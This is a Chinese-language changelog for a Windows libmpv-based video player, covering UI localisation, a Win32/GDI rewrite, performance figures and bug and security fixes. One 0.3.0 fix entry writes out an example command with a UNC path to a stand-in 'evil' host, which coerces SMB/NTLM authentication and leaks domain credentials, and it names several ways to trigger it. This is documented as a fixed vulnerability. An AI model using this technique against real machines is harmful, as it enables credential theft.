# 更新日志

本项目遵循 [语义化版本](https://semver.org/lang/zh-CN/)。

## [0.3.0] - 2026-10-06

界面文案国际化 + 安装器语言选择、控件尺寸改按文字实测、安全加固、
解码线程数改按物理核。

### 新增

- **中英文界面**：新增 `lang` 模块集中管理全部面向用户文案。取值顺序：
  `VIDEOVIEW_LANG` 环境变量 > 安装器写入的注册表 > 系统界面语言 > 英文
- **安装器语言选择页**：English / 简体中文二选一，装完即生效。注册表分
  HKLM 与 HKCU 两处读（安装权限有两种）
- **控件尺寸按当前语言的实测文字宽度计算**（新增 `ui::Metrics`），
  不再使用写死的 DIP 常量。中文两字与英文单词长度差很多，写死必然有一边
  被截断（`"Pause"` / `"Volume"` 在原来的 48 DIP 框里放不下）
- **硬件解码状态可观测**：新增 `hwdec-current`，接到 `UiState.hwdec`。
  D3D11VA 探测失败时 mpv 不发 error 也不发 warning，只是悄悄退回软解，
  现在这是唯一的观测手段
- 新增 `cpu` 模块：按**物理核**枚举（`GetLogicalProcessorInformationEx`）

### 变更

- 控制栏三组控件（按钮 / 文件名 / 音量）重新分布：边距 10 → 14 DIP，
  新增 20 DIP 组间距，文件名从右对齐改为在中间那段居中
- 播放/暂停、静音/音量取两者较宽者 —— 切换状态时按钮宽度不再变化、
  整排按钮不跳动
- 时间码列宽按最坏情况 `88:88:88` 实测，`h:mm:ss` 不再被切
- `vd-lavc-threads` 改按物理核。原来用 `available_parallelism()`，
  在 Windows 上那是逻辑核数；i3-3xxx（2 物理核 + 4 线程）会开 4 条解码
  线程在 2 个核上抢执行单元
- `hwdec=auto-safe` → `auto`。mpv 文档：两者定义完全相同，
  `auto-safe` 是早期命名残留
- 新增 `vd-lavc-dr=no`：d3d11 上下文下它本来就无效，显式写是记录
  「这条路径不依赖 DR」
- 安装器新增 `SetRegView 64`。makensis 是 32 位进程，
  `RequestExecutionLevel` 只提权不切注册表视图
- 播放时不再每帧把整个客户区填成黑色。mpv 的子窗口把视频区整个盖住，
  4K 下这是每次 `WM_PAINT` 830 万次写像素的纯浪费
- mpv 层与启动层的错误信息改为英文（面向用户的部分已按语言本地化）

### 修复

- **UNC 路径可被强制发起 SMB/NTLM 认证**（高危）。
  `video-view.exe "\\evil\share\a.mp4"` 一个命令行参数就能让受害者进程
  用自己的凭据去连攻击者的共享交出域凭据；`.lnk`、注册表
  `shell\open\command`、任何 `CreateProcess` 的调用方都能触发。现在挡在
  `is_file()` **之前**（`metadata()` 自己就会建 SMB 连接），同时挡掉
  扩展 UNC、设备路径、`//` 正斜杠 UNC、ADS 与依赖 CWD 的相对路径
- **`WM_CREATE` 里弹 MessageBox**（高危）。那是在 `CreateWindowExW`
  尚未返回时嵌套跑一个模态消息循环：用户按 Esc 会造成「窗口已在创建中
  被销毁 + 返回 -1」这个未定义组合，且嵌套循环里能撞上
  `panic = "abort"` 下的静默闪退。改成存进 `create_error`，窗口创建
  彻底结束后再弹。顺带修掉 `WM_CREATE` 返回 -1 时 `GetLastError`
  不被设置、错误显示成「操作成功完成」
- **启动时序**（高危）。原来 `SetTimer` 在 `WM_CREATE` 里武装，而消息
  循环要等整个 `MpvPlayer::new`（D3D11 初始化几百毫秒）之后才开始。
  这段窗口里任何一次消息泵被跑起来就会 `WM_TIMER` → `player()` →
  `expect()` → `panic = "abort"` 下整个进程静默消失。定时器挪到
  `player` 就位之后，并加 `pump_messages()` 抽干创建期积压的绘制消息
- 打开文件失败后界面卡在「已加载但没在播」：文件名显示着、按钮亮着，
  而画面区露出后备位图里的旧内容。现在退回空闲态
- 注册表读取加 64 字节上限：`HKCU\Software\VideoView\Language` 是用户
  可写的，一个 64MB 的值就能让每次启动分配 128MB
- `clamp_to_client` 对负客户区尺寸不再 panic（`i32::clamp` 在
  `min > max` 时 panic，`panic = "abort"` 下就是整个进程消失）
- 字体创建失败时不再往常驻后备位图 DC 上 `SelectObject(hdc, NULL)`
  —— 那会让 DC 进入无选中对象状态，之后 `BitBlt` 静默失败、控制栏整会话
  空白且零日志。同时还原 `SetBkMode`
- 9 处 `lock().unwrap()` 改成防中毒版本（`surface.rs` 的测试里本来就是
  对的，产品代码一处都没有）

### 文档

- 纠正了 `demuxer-*` 三项配置的注释。它们在本地文件播放路径下**不生效**：
  mpv 的 `demux.c` 里 `use_cache = is_streaming`，本地文件
  `streaming = false` → `seekable_cache = false` → 缓存根本不分配。
  原来「实测默认配置下光这一项就吃掉上百 MB」的结论与代码路径矛盾
- `package.ps1` 新增 `app.manifest` 程序集清单版本校验。它与 exe 的
  `FileVersion` 是两个独立的版本号，只查后者抓不到清单版本漂移

### 性能实测

125% 缩放、H.264 640×480、`hwdec-current = d3d11va`：

| 状态 | 窗口 | 工作集 | private | CPU | GPU 3D | GPU 解码 |
| --- | --- | --- | --- | --- | --- | --- |
| 空闲 | 1082×673 | 49 MB | 33 MB | 0.1–3% | ~0 | ~0 |
| 播放 | 1082×673 | 135 MB | 115 MB | 9.9% | 4.0% | 0.7% |
| 播放 | 1882×953 | 142 MB | 122 MB | 9.2% | 7.4% | 0.8% |

连续播放 60 秒工作集无增长。播放时那 135 MB 里有 62.7 MB 是三个 Intel
驱动模块（`igc64.dll` / `igd11dxva64.dll` / `igd10umdgen11.dll`），是
D3D11 渲染路径的固定开销 —— 关掉硬件解码内存几乎不变（110.8 → 106.4 MB），
所以保留硬件解码（它更省 CPU）。

测试素材最大只有 640×480，因此表中的 GPU 解码占用**不代表 1080p/4K**。

## [0.2.0] - 2026-10-05

界面从 Tauri + WebView2 换成原生 Win32 + GDI 自绘。起因是用户反馈
「放大之后字体都不清晰」与「内存占用了 400MB」。

### 变更

- **界面重写为纯 Win32 + GDI**，移除 WebView2 与全部前端工程
  - 删除 `src/`、`index.html`、`package.json`、`package-lock.json`、
    `tsconfig.json`、`vite.config.ts`、`src-tauri/tauri.conf.json`、
    `capabilities/`
  - 新增 `src-tauri/src/app.rs`（窗口与消息循环）与
    `src-tauri/src/ui.rs`（控制栏布局、绘制与命中测试）
  - 播放核心、视频子窗口、文件打开与快捷键行为保持不变

- **文字放大并保持锐利**
  - 字号由 11/12/13 CSS px 提到 14/13/15 DIP，时间码与按钮字形高度
    从约 10 物理像素变为约 19
  - 去掉 Chromium 的位图缩放路径：125% / 150% 缩放下原先是把整页位图
    拉伸，笔画边缘会出现灰阶过渡带；现在由 GDI 按字体 hinting 直接画到
    目标设备，边缘只有 1px 过渡
  - DPI 感知由 `SetProcessDpiAwarenessContext(PER_MONITOR_AWARE_V2)`
    显式开启，并在 exe 清单里再声明一次，双保险

- **界面完全自动按 DPI 缩放**，没有任何选项或开关

- **内存占用 442MB → 播放时约 133MB 工作集**
  - WebView2 的 Chromium 进程占了约 324MB，去掉 WebView2 是唯一能大幅
    下降的路径
  - 常驻后备位图：控制栏每 250ms 重画一次，原本每次都新建一块整客户区
    大小的 DC + 位图（1375×900×4 ≈ 4.9MB）再释放，现在缓存复用，
    只在客户区尺寸变化时重建
  - 绘制也按脏区裁剪：进度条刷新时脏区只有底部 78px 高的控制栏，
    原本却每帧把 1375×900 整个客户区重填一遍
  - 画刷按颜色缓存，不再每次 `CreateSolidBrush` / `DeleteObject`
  - 只把脏区拷到屏幕
  - mpv 加上内存上限：`demuxer-max-bytes=48MiB`、
    `demuxer-max-back-bytes=16MiB`、`cache-pause=no`、
    `vd-lavc-threads=clamp(1,4)`
  - 进程从 7 个减到 1 个；播放时工作集 133MB / private 113MB，
    空闲时 47MB / 33MB（125% 缩放、1100×720 窗口实测）

- **播放进度改为主动轮询**
  - 不再 observe `time-pos`，改为 UI 线程 250ms 定时器读一次属性
  - 去掉为此引入的 serde / JSON 依赖

- **打包流程重做**：`scripts/package.ps1` 一次产出 NSIS 安装包
  与免安装 zip，两者都自带 `libmpv-2.dll`，对方机器不需要装
  Rust / Node.js。打包时再校验一次 DLL 哈希与 exe 里的版本号

- exe 资源信息与图标、清单、许可页一并补齐，版本号与 `Cargo.toml` 对齐。
  窗口类图标改为从资源 id 1 加载：原来写的是 `IDC_ICON` /
  `IDI_APPLICATION`，而这两个宏是同一个值 32512，也就是**系统通用应用图标**，
  任务栏和标题栏看不出是哪个程序

### 测试

- 新增 `scripts/verify-ui.ps1` 端到端界面验收（13 项）：传输控制、进度条与
  时间码推进、影院模式、全屏几何
- 进度条与时间码这两项是「控制栏不刷新」的端到端防线；
  `blit_points` 的坐标约定另有 3 条单测。两者都验证过**在 bug 复现时会失败**

### 修复

- **控制栏不刷新**：脏区重绘把内容贴到了错误位置，界面上看到的是
  第一次全量绘制留下的静止画面（时间码停在 `00:00`、进度条 thumb 钉在最左）
  - 根因一：`BeginPaint` 返回的 DC 原点仍在客户区 `(0,0)`，更新区只是被
    裁剪而非平移，`BitBlt` 目标点写 `(0,0)` 会把控制栏画到窗口顶部、
    被视频子窗口盖住
  - 根因二：想让绘制坐标跟着脏区走而调用的 `SetWindowOrgEx` 用错了符号
    （原点要的是客户区 `(0,0)` 落在位图的哪个像素，负偏移会被 GDI 直接拒绝）
  - 修法：后备位图与客户尺寸同坐标系，源点与目标点都用同一组客户区坐标
- **播放中控制栏看起来卡住不动**：与上一条同因
- **双击画面会同时暂停**：双击的第二击和第一击都上报成了「单击切换播放」，
  一次双击就是「进了影院模式 + 又暂停了一下」。现在按
  `GetDoubleClickTime()` 和位置容差自己判定，吞掉重复的那次
  （此前能否去重取决于 mpv 自己建的渲染子窗口带没带 `CS_DBLCLKS`）
- **鼠标拖动中断后控制栏永久不再刷新**：捕获被别处抢走时
  （任务栏介入、远程会话断开）没有复位 `dragging`，进度条从此停在旧值，
  且界面没有任何提示。补 `WM_CAPTURECHANGED`
- **音量拖动时每个鼠标移动事件都同步下发一次 mpv**：`WM_MOUSEMOVE` 能到
  1kHz。现在拖动过程只更新界面，松手时才下发最终值
- **窗口边框上的双向缩放光标被换成箭头**：`WM_SETCURSOR` 不看 hit-test
  code 就自己设光标，拖不动窗口边缘了。非客户区现在交回系统处理
- **切到别的窗口再点回来，快捷键全部失灵**：点控制栏时不抢焦点，
  键盘消息就发不到主窗口
- **启动失败时可能访问已释放内存**：窗口已建好之后若 mpv 初始化失败，
  直接返回错误会把 `App` 释放掉，而窗口还活着、`GWLP_USERDATA` 仍指着那块
  内存——随后自己弹的错误框会转一圈消息循环踩上去。现在先销毁窗口再返回，
  并在 `WM_NCDESTROY` 里清空该指针
- **模态对话框期间持有 `&mut App`**：`MessageBoxW` 与文件对话框自带消息循环，
  会重入窗口过程再取一次 `&mut App`。错误提示与打开对话框改为置标志 +
  `PostMessage`，全屏切换也拆成「算样式 / `SetWindowPos` / 收尾」三段
- **GDI 句柄泄漏**：最小化时客户区是 0×0，却先建了 DC 再发现位图建不出来，
  那个 DC 没人释放；每次最小化/还原往返漏一个
- **`mpv_destroy` 可能被调两次**：`shutdown()` 与 `Drop` 都走销毁路径
- **正式版会认 `MPV2_DLL` 环境变量**：等于允许任意能设置环境变量的人
  让正式版去加载任意位置的 DLL。该变量现在只在 debug 构建里生效
- **文件路径无法表示为 UTF-8 时报错指错方向**：原来用 `to_string_lossy`
  悄悄替换成 U+FFFD，用户看到的是「找不到文件」。现在明确报「路径无法表示」
- **安装包升级安装时其实没升级**：`RMDir /r` 删不掉正被占用的 exe 与 DLL，
  NSIS 不报错也不中断，装完仍是上一版。现在先 `taskkill` 再动目录

### 安全

- 安装程序不再改动文件关联，留给用户在首次启动时自选
- 画面子窗口加 `WS_EX_NOACTIVATE`，单击画面不会抢走键盘焦点
- 视频区空闲时隐藏画面窗口，露出自绘的欢迎提示，而不是留一块黑屏

## [0.1.0] - 2026-10-04

首个版本，最小可用功能。

### 许可

以 **GPL-3.0-or-later** 发布。选用 GPL 而非 MIT 是必然结果：
播放核心 libmpv 必须链接 GPL 授权的 `libx264` / `libx265`
才能支持 H.264 / HEVC，而 FFmpeg 的 LGPL 构建不含这两个编码器。
第三方组件清单见 `THIRD_PARTY_NOTICES.md`。

### 新增

- 基于 Tauri 2 + Rust 的 Windows 桌面播放器，界面用原生 TypeScript + Vite，
  无前端框架依赖
- 以 **libmpv** 为播放核心，运行时动态加载 `libmpv-2.dll`
  - 构建期不需要 libclang，也不需要 mpv 头文件或 import lib
  - 仓库内只有一份手写的最小 ABI 声明（`src-tauri/src/mpv/ffi.rs`）
- 打开本地视频：文件对话框、拖放到窗口、命令行传参三种方式
- 播放、暂停、停止
- 进度条，显示当前时间与总时长，可拖动跳转
- 音量控制与静音切换
- 影院模式（隐藏控制栏）
- `F11` 全屏
- 键盘快捷键：空格播放/暂停、`Ctrl+O` 打开、方向键快进快退、
  `F` 影院模式、`F11` 全屏、`Esc` 退出影院模式 / 退出全屏
- 画面自适应窗口：缩放窗口时视频区跟随重排，按原始宽高比缩放并补黑边
- 集成测试直接驱动真实 libmpv，覆盖 8 种容器 × 12 种编码
- NSIS 安装程序打包

### 安全

- 播放核心按锁定版本下载，`scripts/fetch-libmpv.ps1` 逐层校验 SHA-256，
  版本与哈希记录在 `scripts/libmpv.lock.json`
- 不读取用户 `%APPDATA%\mpv` 下的配置，也不加载任何 mpv 脚本
- 只接受磁盘上确实存在的普通文件，挡住 `http://` / `concat://` 之类的协议 URL
- 正式版只在 exe 同级与 `resources/` 查找 `libmpv-2.dll`，
  不再向上遍历目录（避免 DLL 劫持）
- 前端启用严格 CSP（`script-src 'self'`，禁止 object/frame）

### 已知限制

- 仅支持 Windows x64
- 不支持播放列表、字幕轨选择、音视频轨切换
- 不支持网络流

[0.3.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.3.0
[0.2.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.2.0
[0.1.0]: https://github.com/Liu-bits/video-view/releases/tag/v0.1.0
